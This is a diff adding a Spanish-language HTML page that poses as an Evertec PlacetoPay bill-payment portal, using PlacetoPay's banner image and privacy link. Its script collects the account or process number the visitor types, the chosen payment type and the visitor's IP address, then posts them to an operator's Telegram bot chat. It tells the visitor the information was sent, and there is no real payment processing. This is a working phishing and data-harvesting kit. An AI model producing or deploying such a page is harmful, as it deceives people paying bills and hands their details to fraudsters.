@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  margin: 0;
+  font-family: "Segoe UI", Arial;
+  background: #f3f4f6;
+}
+
+/* BANNER */
+.top-banner img {
+  width: 100%;
+  display: block;
+}
+
+/* CONTENIDO */
+.main {
+  display: flex;
+  padding: 30px;
+}
+
+/* IZQUIERDA (YA PLANO) */
+.left {
+  width: 50%;
+  padding: 0;
+  background: transparent;
+  box-shadow: none;
+}
+
+/* DERECHA */
+.right {
+  width: 50%;
+  padding-left: 40px;
+}
+
+/* TEXTOS */
+.title {
+  font-weight: 600;
+  margin-bottom: 20px;
+}
+
+.label {
+  font-size: 13px;
+  font-weight: 600;
+  margin-top: 15px;
+}
+
+/* SELECT */
+.select-box {
+  position: relative;
+}
+
+.select {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  margin-top: 6px;
+  cursor: pointer;
+  display: flex;
+  justify-content: space-between;
+  background: #fff;
+}
+
+.options {
+  display: none;
+  position: absolute;
+  width: 100%;
+  background: white;
+  border-radius: 8px;
+  margin-top: 5px;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+  z-index: 9999;
+}
+
+.option {
+  padding: 12px;
+  cursor: pointer;
+}
+
+.option:hover {
+  background: #ff6a00;
+  color: white;
+}
+
+/* INPUT */
+.input {
+  width: 100%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 8px;
+  margin-top: 6px;
+  background: #fff;
+}
+
+/* TEXTOS */
+.info {
+  font-size: 12px;
+  color: #6b7280;
+  margin-top: 10px;
+}
+
+.legal {
+  font-size: 14px;
+  color: #4fc3f7;
+  margin-top: 15px;
+  line-height: 1.5;
+}
+
+.legal a {
+  color: #1e88e5;
+  font-weight: bold;
+  text-decoration: none;
+}
+
+/* BOTÓN */
+.btn {
+  width: 100%;
+  background: #7aa6df;
+  color: white;
+  border: none;
+  padding: 12px;
+  border-radius: 8px;
+  margin-top: 20px;
+  cursor: pointer;
+}
+
+.btn:hover {
+  background: #5f8bc9;
+}
+
+/* DERECHA TEXTO */
+.right h2 {
+  margin-top: 0;
+}
+
+.right p {
+  color: #555;
+  line-height: 1.5;
+}
+
+/* NOTIFICACIÓN */
+.notification {
+  display: none;
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  background: #4CAF50;
+  color: white;
+  padding: 15px 20px;
+  border-radius: 8px;
+  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+  z-index: 10000;
+  animation: slideIn 0.3s ease;
+}
+
+.notification.error {
+  background: #f44336;
+}
+
+@keyframes slideIn {
+  from {
+    transform: translateX(100%);
+    opacity: 0;
+  }
+  to {
+    transform: translateX(0);
+    opacity: 1;
+  }
+}
+
+/* RESPONSIVE */
+@media(max-width: 768px) {
+  .main {
+    flex-direction: column;
+    padding: 15px;
+  }
+
+  .left, .right {
+    width: 100%;
+    padding: 0;
+  }
+
+  .right {
+    margin-top: 20px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<!-- BANNER -->
+<div class="top-banner">
+  <img src="https://placetopay-static-prod-bucket.s3.us-east-2.amazonaws.com/placetopay-com/microsites/images/mAwF1IvHdXAl9ReOp1aKZKGNpdXgHuDj9cLbbvJA.png">
+</div>
+
+<div class="main">
+
+  <!-- IZQUIERDA -->
+  <div class="left">
+
+    <div class="title">
+      Comience el proceso de pago, ingresando la siguiente información
+    </div>
+
+    <!-- TIPO CONSULTA -->
+    <div class="label">Tipo de consulta *</div>
+    <div class="select-box">
+      <div class="select" onclick="toggle('consulta')">
+        <span id="consultaText">Número de cuenta</span>
+        <span>⌄</span>
+      </div>
+
+      <div class="options" id="consultaOptions">
+        <div class="option" onclick="selectOption('consulta', this)">Número de cuenta</div>
+        <div class="option" onclick="selectOption('consulta', this)">Número de proceso</div>
+      </div>
+    </div>
+
+    <!-- TIPO PAGO -->
+    <div id="tipoPagoContainer">
+      <div class="label">Tipo de pago *</div>
+      <div class="select-box">
+        <div class="select" onclick="toggle('pago')">
+          <span id="pagoText">Seleccione el tipo de pago</span>
+          <span>⌄</span>
+        </div>
+
+        <div class="options" id="pagoOptions">
+          <div class="option" onclick="selectOption('pago', this)">Pago total</div>
+          <div class="option" onclick="selectOption('pago', this)">Pago sin alumbrado público</div>
+          <div class="option" onclick="selectOption('pago', this)">Abonos</div>
+          <div class="option" onclick="selectOption('pago', this)">Saldos</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- INPUT -->
+    <div class="label" id="inputLabel">Número de cuenta</div>
+    <input class="input" type="text" id="numeroInput" placeholder="Ingrese el número">
+
+    <div class="info">
+      Puede consultar máximo 15 números presionando Enter.
+    </div>
+
+    <!-- TEXTO LEGAL -->
+    <div class="legal">
+      Al continuar, acepto las <b>políticas</b> aplicables para el tratamiento de mis datos personales según la jurisdicción local del responsable y de 
+      <a href="https://www.placetopay.com/web/politicas-de-privacidad/" target="_blank">
+        Evertec PlacetoPay
+      </a>.
+    </div>
+
+    <button class="btn" onclick="enviarATelegram()">Ingresar</button>
+
+  </div>
+
+  <!-- DERECHA -->
+  <div class="right">
+    <h2>Pagos electrónicos</h2>
+    <p>
+      Desde su casa, oficina o cualquier lugar, pague de forma segura a través de nuestro sistema de pago.
+      Use nuestro servicio desde las 00:01 am hasta 11:30 pm, los 7 días de la semana.
+    </p>
+  </div>
+
+</div>
+
+<!-- NOTIFICACIÓN -->
+<div id="notification" class="notification"></div>
+
+<script>
+// ⚠️ IMPORTANTE: Configura tus datos de Telegram aquí
+const TELEGRAM_CONFIG = {
+  botToken: 'TU_TOKEN_DE_BOT_AQUI', // Reemplaza con el token de tu bot
+  chatId: 'TU_CHAT_ID_AQUI' // Reemplaza con tu chat ID
+};
+
+function toggle(tipo) {
+  let box = document.getElementById(tipo + "Options");
+  box.style.display = box.style.display === "block" ? "none" : "block";
+}
+
+function selectOption(tipo, el) {
+  document.getElementById(tipo + "Text").innerText = el.innerText;
+  document.getElementById(tipo + "Options").style.display = "none";
+
+  if (tipo === "consulta") {
+    let tipoPago = document.getElementById("tipoPagoContainer");
+    let label = document.getElementById("inputLabel");
+
+    if (el.innerText === "Número de cuenta") {
+      tipoPago.style.display = "block";
+      label.innerText = "Número de cuenta";
+    } else {
+      tipoPago.style.display = "none";
+      label.innerText = "Número de proceso";
+    }
+  }
+}
+
+// Función para mostrar notificaciones
+function mostrarNotificacion(mensaje, esError = false) {
+  const notification = document.getElementById('notification');
+  notification.textContent = mensaje;
+  notification.className = 'notification' + (esError ? ' error' : '');
+  notification.style.display = 'block';
+  
+  setTimeout(() => {
+    notification.style.display = 'none';
+  }, 3000);
+}
+
+// Función para enviar mensaje a Telegram
+async function enviarATelegram() {
+  // Validar que los campos estén completos
+  const tipoConsulta = document.getElementById('consultaText').innerText;
+  const numero = document.getElementById('numeroInput').value.trim();
+  
+  if (!numero) {
+    mostrarNotificacion('Por favor ingrese un número', true);
+    return;
+  }
+
+  // Obtener tipo de pago si aplica
+  let tipoPago = 'No aplica';
+  if (document.getElementById('tipoPagoContainer').style.display !== 'none') {
+    tipoPago = document.getElementById('pagoText').innerText;
+    if (tipoPago === 'Seleccione el tipo de pago') {
+      mostrarNotificacion('Por favor seleccione el tipo de pago', true);
+      return;
+    }
+  }
+
+  // Mostrar notificación de envío
+  mostrarNotificacion('Enviando información...');
+
+  // Obtener fecha y hora actual
+  const fecha = new Date();
+  const fechaFormateada = fecha.toLocaleString('es-CO', {
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit'
+  });
+
+  // Crear mensaje para Telegram
+  const mensaje = `
+🔔 *NUEVA CONSULTA DE PAGO* 🔔
+
+📅 *Fecha y hora:* ${fechaFormateada}
+📌 *Tipo de consulta:* ${tipoConsulta}
+💳 *Tipo de pago:* ${tipoPago}
+🔢 *Número:* ${numero}
+
+🌐 *IP del usuario:* ${await obtenerIP()}
+  `;
+
+  try {
+    // Verificar que el token y chat ID estén configurados
+    if (TELEGRAM_CONFIG.botToken === 'TU_TOKEN_DE_BOT_AQUI' || TELEGRAM_CONFIG.chatId === 'TU_CHAT_ID_AQUI') {
+      mostrarNotificacion('Error: Configura tu token y chat ID de Telegram', true);
+      console.error('Por favor configura tu token de bot y chat ID de Telegram');
+      return;
+    }
+
+    // Enviar a Telegram
+    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+    
+    const respuesta = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CONFIG.chatId,
+        text: mensaje,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    const datos = await respuesta.json();
+
+    if (datos.ok) {
+      mostrarNotificacion('✅ Información enviada correctamente');
+      
+      // Opcional: Limpiar el formulario
+      // document.getElementById('numeroInput').value = '';
+      // document.getElementById('consultaText').innerText = 'Número de cuenta';
+      // document.getElementById('pagoText').innerText = 'Seleccione el tipo de pago';
+    } else {
+      mostrarNotificacion('❌ Error al enviar la información', true);
+      console.error('Error de Telegram:', datos);
+    }
+  } catch (error) {
+    mostrarNotificacion('❌ Error de conexión', true);
+    console.error('Error:', error);
+  }
+}
+
+// Función para obtener la IP del usuario
+async function obtenerIP() {
+  try {
+    const respuesta = await fetch('https://api.ipify.org?format=json');
+    const datos = await respuesta.json();
+    return datos.ip;
+  } catch {
+    return 'No disponible';
+  }
+}
+
+// Cerrar opciones al hacer clic fuera
+document.addEventListener('click', function(event) {
+  if (!event.target.closest('.select-box')) {
+    document.querySelectorAll('.options').forEach(opt => {
+      opt.style.display = 'none';
+    });
+  }
+});
+
+// Permitir envío con Enter
+document.getElementById('numeroInput').addEventListener('keypress', function(e) {
+  if (e.key === 'Enter') {
+    enviarATelegram();
+  }
+});
+
+// Validar que solo se ingresen números (opcional)
+document.getElementById('numeroInput').addEventListener('input', function(e) {
+  this.value = this.value.replace(/[^0-9]/g, '');
+});
+</script>
+
+</body>
+</html>
